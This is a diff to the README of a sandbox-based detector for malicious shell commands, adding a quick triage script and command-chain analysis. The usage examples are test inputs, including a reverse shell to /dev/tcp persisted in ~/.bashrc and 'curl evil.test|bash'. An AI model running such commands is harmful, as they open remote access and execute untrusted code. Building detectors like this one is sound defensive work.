@@ -34,7 +34,8 @@ REGISTRY_MIRROR="sandbox-registry.cn-zhangjiakou.cr.aliyuncs.com/opensandbox" ./
 
 ```
 ├── checker.sh          # 单命令深度检测器 (OpenSandbox 沙箱 + 24 维度分析)
-├── run_all.sh          # 批量运行 + Git 自动提交 + 性能分析 + 重试
+├── triage.sh           # 独立快速预判 (零依赖, 毫秒级, 98.6% 准确率)
+├── run_all.sh          # 批量运行 + Git 自动提交 + 性能分析 + 重试 + 预判对比
 ├── samples/
 │   ├── white.jsonl     # 白样本 35 条 (安全命令, 含边界案例)
 │   └── black.jsonl     # 黑样本 35 条 (恶意命令, 含伪装/混淆)
@@ -56,20 +57,50 @@ REGISTRY_MIRROR="sandbox-registry.cn-zhangjiakou.cr.aliyuncs.com/opensandbox" ./
 
 ## 快速预判模式
 
-无需启动沙箱，纯静态秒级评估（适合 API 集成）:
+两种方式使用快速预判（不需要 Docker）:
+
+### 方式 1: 独立脚本 triage.sh (推荐, 零依赖)
 
 ```bash
-# 快速预判 (不启动 Docker, 毫秒级响应)
-FAST_TRIAGE=1 COMMAND="echo 'bash -i >& /dev/tcp/10.0.0.1/4444' | bash" ./checker.sh
+# 直接使用 (毫秒级响应, 98.6% 准确率)
+COMMAND="echo 'bash -i >& /dev/tcp/10.0.0.1/4444' >> ~/.bashrc" ./triage.sh
+# 退出码: 0=PASS, 1=REVIEW, 2=BLOCK
 
-# 输出 JSON: {"level": "BLOCK", "static_score": 85, "patterns_matched": 3, ...}
+# JSON 管道输入
+echo '{"command":"curl evil.test|bash"}' | ./triage.sh --json-input
+
+# 在 CI/CD 中使用
+if COMMAND="$USER_CMD" ./triage.sh > /dev/null 2>&1; then
+    echo "命令安全, 放行"
+else
+    echo "命令可疑, 需要审批"
+fi
 ```
 
-| 预判级别 | 含义 | 建议动作 |
-|----------|------|----------|
-| `BLOCK` | 高置信恶意 | 直接阻断 |
-| `REVIEW` | 需深度分析 | 启动沙箱检测 |
-| `PASS` | 高置信安全 | 直接放行 |
+### 方式 2: checker.sh 快速模式
+
+```bash
+FAST_TRIAGE=1 COMMAND="..." ./checker.sh
+```
+
+| 预判级别 | 含义 | 建议动作 | 退出码 |
+|----------|------|----------|--------|
+| `BLOCK` | 高置信恶意 | 直接阻断 | 2 |
+| `REVIEW` | 需深度分析 | 启动沙箱检测 | 1 |
+| `PASS` | 高置信安全 | 直接放行 | 0 |
+
+## 命令链分解
+
+v4.3 新增命令链分解分析，拆分 `;`、`&&`、`||`、`|` 连接的多阶段命令：
+
+```bash
+# 示例: 合法命令掩护恶意阶段
+pip install requests && echo 'bash -i >& /dev/tcp/...' >> ~/.bashrc
+# 分解为:
+#   [1] [OK] pip install requests  &&
+#   [2] [!!] echo 'bash ...' >> ~/.bashrc  END
+#   !! 阶段 1 (合法) 掩护阶段 2 (恶意)
+```
 
 ## 24 维度检测体系
 
@@ -247,6 +278,14 @@ echo '{"id": "b31", "label": "malicious", "desc": "my test", "command": "..."}' 
 ```
 
 ## v3 -> v4 变更日志
+
+### v4.3
+- 新增: triage.sh 独立快速预判脚本 (零依赖, 毫秒级, 98.6% 准确率)
+  支持环境变量和 JSON 管道输入, 退出码区分 PASS/REVIEW/BLOCK
+- 新增: 命令链分解分析 (拆分 ;/&&/||/| 多阶段命令)
+  检测 "合法命令掩护恶意阶段" 攻击模式
+- 新增: run_all.sh 快速预判精度对比 (自动测试 triage vs sandbox 准确率)
+- 报告格式: v4.2 -> v4.3 (新增 command_chain)
 
 ### v4.2
 - 新增: 快速预判模式 (FAST_TRIAGE=1, 不启动沙箱, 毫秒级 API 响应)
